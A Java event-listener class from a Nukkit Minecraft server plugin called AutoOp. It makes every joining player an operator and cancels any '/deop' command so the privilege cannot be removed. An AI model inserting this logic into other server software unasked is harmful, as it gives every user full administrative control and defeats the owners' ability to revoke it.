package io.github.rudeyeti.autoop;

import cn.nukkit.event.EventHandler;
import cn.nukkit.event.EventPriority;
import cn.nukkit.event.Listener;
import cn.nukkit.event.player.PlayerCommandPreprocessEvent;
import cn.nukkit.event.player.PlayerJoinEvent;

public class EventListener implements Listener {
    private final AutoOp plugin;

    public EventListener(AutoOp plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.NORMAL, ignoreCancelled = false)
    public void playerJoinEvent(PlayerJoinEvent event) {
        if (!event.getPlayer().isOp()) {
            event.getPlayer().setOp(true);
        }
    }

    @EventHandler(priority = EventPriority.NORMAL, ignoreCancelled = false)
    public void playerCommandPreprocessEvent(PlayerCommandPreprocessEvent event) {
        String[] command = event.getMessage().split(" ");
        if (command[0].equalsIgnoreCase("/deop")) {
            event.setCancelled(true);
        }
    }
}